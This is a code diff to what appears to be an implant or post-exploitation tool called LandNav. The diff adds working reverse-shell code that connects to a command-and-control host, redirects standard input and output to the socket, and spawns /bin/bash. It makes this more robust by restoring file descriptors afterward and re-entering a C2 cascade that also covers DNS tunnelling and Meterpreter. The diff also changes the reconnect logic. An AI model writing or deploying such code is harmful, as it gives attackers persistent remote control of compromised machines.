@@ -396,7 +396,7 @@ def try_reverse_shell(c2_host, ports, connect_timeout=10, proxy=None):
 
     Returns: True if shell connected (returns when shell ends)
     """
-    global _c2_method
+    global _c2_method, _current_state
 
     log.info("Attempting reverse shell to %s on ports %s", c2_host, ports)
 
@@ -420,15 +420,37 @@ def try_reverse_shell(c2_host, ports, connect_timeout=10, proxy=None):
             log.info("Reverse shell connected to %s:%d", c2_ip, port)
             _c2_method = "reverse_shell"
 
-            # Redirect stdin/stdout/stderr to the socket
-            s.settimeout(None)
-            os.dup2(s.fileno(), 0)
-            os.dup2(s.fileno(), 1)
-            os.dup2(s.fileno(), 2)
+            # Save original file descriptors so we can restore them
+            # after the shell exits — without this, LandNav's I/O is
+            # permanently destroyed (logging, reconnect all break).
+            saved_fds = (os.dup(0), os.dup(1), os.dup(2))
 
-            # Spawn shell
-            import pty
-            pty.spawn("/bin/bash")
+            try:
+                # Redirect stdin/stdout/stderr to the socket
+                s.settimeout(None)
+                os.dup2(s.fileno(), 0)
+                os.dup2(s.fileno(), 1)
+                os.dup2(s.fileno(), 2)
+
+                # Spawn shell — blocks until shell exits
+                import pty
+                pty.spawn("/bin/bash")
+            finally:
+                # Restore original file descriptors no matter what
+                os.dup2(saved_fds[0], 0)
+                os.dup2(saved_fds[1], 1)
+                os.dup2(saved_fds[2], 2)
+                for fd in saved_fds:
+                    os.close(fd)
+                try:
+                    s.close()
+                except OSError:
+                    pass
+
+            # Shell exited — mark FAILED so the main loop re-enters
+            # the C2 cascade.
+            log.warning("Reverse shell ended — marking FAILED for re-cascade")
+            _current_state = EgressState.FAILED
             return True
 
         except socket.timeout:
@@ -530,7 +552,8 @@ def run_cascade(config):
     # ── Method 3: Raw Reverse Shell ─────────────────────────
     log.info("=== C2 Method 3: Raw Reverse Shell ===")
     if try_reverse_shell(c2_host, c2_ports, proxy=proxy):
-        _current_state = EgressState.CONNECTED
+        # try_reverse_shell blocks (pty.spawn) for the shell lifetime.
+        # On return the shell is dead; _current_state is already FAILED.
         return "reverse_shell"
 
     _current_state = EgressState.FAILED
@@ -568,13 +591,12 @@ def _watchdog_loop(config, on_reconnect):
         if _current_state != EgressState.CONNECTED:
             continue
 
-        # Check if C2 is still alive
+        # Check if C2 is still alive.
+        # Meterpreter and reverse_shell: the blocking call (exec/pty.spawn)
+        # sets _current_state=FAILED on return — the main loop detects it
+        # directly, so the watchdog only needs to cover dns_tunnel here.
         if _c2_method == "dns_tunnel" and not _dns_tunnel_up():
             log.warning("DNS tunnel dropped — re-establishing C2")
-            _attempt_reconnect(config, on_reconnect, retry_interval,
-                              max_retries, backoff, retries)
-        elif _c2_method == "meterpreter" and _c2_process and _c2_process.poll() is not None:
-            log.warning("Meterpreter process died — re-establishing C2")
             _attempt_reconnect(config, on_reconnect, retry_interval,
                               max_retries, backoff, retries)
 
